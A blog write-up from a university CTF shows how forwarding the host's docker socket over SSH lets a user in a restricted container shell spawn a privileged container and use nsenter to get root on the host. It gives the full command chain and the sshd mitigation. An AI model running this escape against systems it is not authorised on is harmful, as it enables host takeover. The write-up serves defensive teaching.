---
title: "16 SSH Forwarding Quirks"
date: 2020-03-23T10:19:06Z
author: "Viktor Barzin"
description: "Abusing SSH forwarding features and common docker config allows for privilege escalation and secure shell escape onto the docker host."
sitemap:
  priority: 0.3
tags:
  [
    "ssh",
    "docker",
    "privilege escalation",
    "shell escape",
    "unix domain socket",
    "forwarding",
    "ctf",
    "attack-defense",
    "nsenter",
    "disable forwarding",
    "docker privilege escalation",
  ]
firstImgUrl: "https://viktorbarzin.me/images/16-ssh-forwarding-quirks-0-18-47-23-resized.png"
draft: false
---

# Introduction

[SSH](https://www.ssh.com/ssh) is a ubiquitous protocol for managing remote machines securely.

Most of the time one would need just shell access to a remote machine to run commands, however, SSH allows for so much more.
One of the interesting features is **SSH forwarding** - you can forward ports, unix sockets, X11 sessions and other interesting stuff.

All of this is fine until you start sharing the ssh server host with other people.
Recently, me and a few other people were organizing an attack-defense style Capture the Flag (CTF) event for my university's cyber security society ([SUCSS](https://www.sucss.org/)).
This blog post will be about a neat trick you can do with SSH forwarding to **escalate privileges** and **escape a restricted shell** environment and gain **root access on the host**.

# Overview of the environment

The environment comprised a single Ubuntu virtual machine (VM) which hosts the entire CTF.
Each team has a user to SSH into this VM and upon successful login is dropped into a docker container.
All of these containers are in the same docker network and can attack each other.

Essentially, this is the environment:

<div style="max-width: 500px; max-height:500px">

![](/images/16-ssh-forwarding-quirks-0-18-47-23.png)

</div>

<br>
This is how the user shell looks like:

```bash
#!/bin/bash

name="$USER"_group
docker run -d -it --rm --pids-limit=50 --cpus="0.5" -m="500m" --device-write-bps /dev/sda:1mb --name $name sucss-group-ctf sudo -u $USER /bin/bash 2>/dev/null

docker exec -it -u $USER $name /bin/bash
```

This shell runs a container for the team and drops them into a shell on the container.

# Abusing SSH forwarding

Now, the above shell looks secure enough and does not let the user at any point to run any commands on the host.

Secure, right?

Well, not quite.

As I mentioned earlier, SSH is quite a powerful protocols and can forward a lot of stuff including unix domain sockets.
The docker CLI, by default, uses [a unix domain socket](https://stackoverflow.com/questions/35110146/can-anyone-explain-docker-sock#answer-35110344) to communicate with the docker API.
This essentially means that all the `docker ps`, `docker run`, `docker network ls` etc. commands **all** go through that socket.

I reckon you already see the arising issue there - you could SSH into the host and forward the docker socket **from the host** locally and then escape on the host.

```bash
$ ssh -L $PWD/docker.sock:/var/run/docker.sock <host>
```

(Forwarding unix sockets requires SSH >=6.7 which you should be running)

Now if we run `docker` using the forwarded socket we will communicate with the remote docker daemon:

```bash
$ docker -H unix://docker.sock ps
```

# Popping a shell

Using docker access to get a shell on the host is now trivial.
We need to spawn a privileged container and mount the host rootfs inside.
We can do so using:

```bash
docker run --privileged --pid=host -it alpine sh
```

- --privileged : grants additional permissions to the container, it allows the container to gain access to and mount the devices of the host (/dev)
- --pid=host : allows the containers to use the processus tree of the Docker host (the VM in which the Docker daemon is running)

The easiest way to spawn a shell using the host rootfs is using the `nsenter` command:

```bash
$ nsenter -t 1 -m -u -n -i sh
```

From the help page:

```
BusyBox v1.31.1 () multi-call binary.

Usage: nsenter [OPTIONS]PROG [ARGS]]

         -t PID          Target process to get namespaces from
         -m[FILE]        Enter mount namespace
         -u[FILE]        Enter UTS namespace (hostname etc)
         -i[FILE]        Enter System V IPC namespace
         -n[FILE]        Enter network namespace
         -p[FILE]        Enter pid namespace
         -U[FILE]        Enter user namespace
         -S UID          Set uid in entered namespace
         -G GID          Set gid in entered namespace
         --preserve-credentials  Don't touch uids or gids
         -r[DIR]         Set root directory
         -w[DIR]         Set working directory
         -F              Don't fork before exec'ing PROG
```

# tl;dr

To get a shell abusing the SSH forwarding capabilities and the docker daemon do:

```bash
$ ssh -L $PWD/docker.sock:/var/run/docker.sock <host>
```

in one shell and in another

```bash
$ docker -H unix://docker.sock run --privileged --pid=host -it alpine nsenter -t 1 -m -u -n -i sh
```

Voala!

# Mitigation

This is possible because of 2 things:

- Default sshd config allows forwarding
- Adding the user to the `docker` group

The second is often done to let people run `$ docker ...` as opposed to `$ sudo docker ...`.
For this environment it's needed because each user needs to start a container and drop the user inside.
The process needs to be automatic and unattended so `sudo` must be passwordless but that's a hassle to setup per user.
Thus adding the user to the `docker` group is the easiest thing to do.

You can think of the above 2 conditions as prerequisites for this vulnerability to exist.
If you fix any of them you would mitigate this issue.

The change you need to make in `/etc/ssh/sshd_config` is adding

```xorg.conf
DisableForwarding yes
```

This disables all forwarding features and I strongly recommend having it in there as a secure default and enable it on per-user basis when needed.

Once you have this in your ssh config, trying the same trick again yields these errors:

In the SSH shell:

```bash
user@host:~$ channel 2: open failed: connect failed: open failed
channel 2: open failed: connect failed: open failed
channel 2: open failed: connect failed: open failed
```

And when you run

```bash
╰─$ docker -H unix://docker.sock run --privileged --pid=host -it alpine nsenter -t 1 -m -u -n -i sh
docker: error during connect: Post http://docker.sock/v1.40/containers/create: read unix @->/home/viktor/docker.sock: read: connection reset by peer.
See 'docker run --help'.
```

# Conclusion

This little neat trick exploits the powers of SSH forwarding as well as the privileges docker gives a user.
**Effectively if a user can spawn docker containers, they have root on that machine** which is scary when you think about it.

Shout out to [Tim Stallard](https://timstallard.me.uk/) for pointing this trick.
Here are a couple of articles on [how to forward the docker socket over ssh](https://medium.com/@dperny/forwarding-the-docker-socket-over-ssh-e6567cfab160) and [how to get a shell on the host from a container](https://medium.com/lucjuggery/a-container-to-access-the-shell-of-the-host-2c7c227c64e9).

Thanks for reading!
